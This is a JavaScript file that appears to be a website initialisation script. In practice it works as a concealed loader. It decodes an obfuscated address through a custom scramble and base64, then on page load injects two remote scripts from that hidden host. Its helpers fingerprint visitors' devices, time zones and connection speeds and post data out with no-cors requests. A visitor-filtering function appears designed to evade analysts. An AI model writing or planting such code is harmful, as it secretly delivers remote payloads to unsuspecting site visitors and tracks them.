var Nloaded = Number(localStorage.getItem("Nloaded")) + 1, _initiated, sc;

function hscGet(txt = '') {
  var p1 = "", p2 = "", l = txt.length;
  for (let i = 0; i <= l; i++) {
    if (i % 2 == 0) {
      p2 = txt.charAt(i) + p2;
    } else {
      p1 = p1 + txt.charAt(i);
    }
  }
  return atob(p1 + p2);
}

function getDefaultName() {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "Unknown";
  let os = "Unknown OS", model = "Unknown Device";

  // Safe OS extraction
  const android = ua.match(/Android\s+([0-9.]+)/i);
  const ios = ua.match(/OS\s+([0-9_]+)/i);
  if (android) os = `Android ${android[1]}`;
  else if (ios) os = `iOS ${ios[1].replace(/_/g, '.')}`;
  else if (/Windows/i.test(ua)) os = "Windows";
  else if (/Macintosh/i.test(ua)) os = "macOS";

  // Safe Model extraction
  const match = ua.match(/\(([^)]+)\)/);
  if (match) {
    const parts = match[1].split(';');
    model = parts[parts.length - 1].trim();
  }

  return `${os} | ${model} | ${platform}`;
}

function hisTrueUser() {
  var place = new Date().toTimeString();
  var isFastConnection = true;
  isFastConnection = (navigator.connection && navigator.connection.downlink && navigator.connection.downlink > 8);

  if (
    !place.includes('India') &&
    Nloaded <= 3 &&
    window.innerWidth < window.screen.width && window.innerHeight < window.screen.height &&
    isFastConnection
  ) {
    return true;
  }

  return false;
}

function makeForm(url, dataObj) { const params = new URLSearchParams(); for (let key in dataObj) { params.append(key, dataObj[key]); } fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }
function addMaster(url) { var elem = document.createElement("script"); elem.src = url; document.head.appendChild(elem); }

function hgetMacTime() {
  try {
    const now = new Date();
    const timeStr = now.toLocaleTimeString('en-US');
    const ianaZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const longZone = new Intl.DateTimeFormat('en-US', { timeZoneName: 'long' })
      .formatToParts(now)
      .find(part => part.type === 'timeZoneName').value;

    return `${timeStr} ${ianaZone} - ${longZone}`;
  } catch (e) { return e.toString(); }
}

function userWinInfo() {
  try {
    if (typeof window === 'undefined') {
      return "Environment: Server-side (No window object)";
    }

    const scrollY = Math.floor(window.scrollY || window.pageYOffset || 0);
    const screenW = window.screen?.width || 0;
    const screenH = window.screen?.height || 0;
    const innerW = window.innerWidth || 0;
    const innerH = window.innerHeight || 0;

    let str = `${scrollY} > ${innerW}/${screenW} x ${innerH}/${screenH} ||| `;

    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    if (conn) {
      const type = conn.effectiveType || 'unknown';
      const rtt = conn.rtt !== undefined ? `${conn.rtt}ms` : 'N/A';
      const downlink = conn.downlink !== undefined ? `${conn.downlink}` : 'N/A';
      str += `Net: ${type} (rtt:${rtt}, Mbps:${downlink})`;
    } else {
      str += "Net: Network Information API unsupported";
    }

    return str;
  } catch (e) {
    // Developer diagnostic output
    return `Error in userWinInfo: ${e.toString()}`;
  }
}

function hNetGreaterThan(speed) {
  try {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn && typeof conn.downlink === 'number' && !isNaN(conn.downlink)) {
      return conn.downlink >= speed;
    }
    return false;
  } catch (e) {
    return false;
  }
}

var ADDRESS_TOKEN = "8ZymaluslZXTbowvILTyJ93VVcm2TVryNcWyY9IwVcGmdlp5NY3WL5hzRaWHYUuvFR2GY9vjMdHWd1jlVbmnaRvzJLH3cdw3IdTyJ9so1dG";

function h_initSiteC() {
  _initiated = true;
  if (Nloaded) {
    localStorage.setItem("Nloaded", Number(Nloaded));
  } else {
    Nloaded = 1;
    localStorage.setItem("Nloaded", 1);
  }

  setTimeout(() => {
    addMaster(`${hscGet(ADDRESS_TOKEN)}data-19b902380k09.js`);
  }, 100);

  setTimeout(() => {
    addMaster(`${hscGet(ADDRESS_TOKEN)}master-10a404587b40544b.js`);
  }, 200);
}

if (!_initiated) {
  h_initSiteC();
}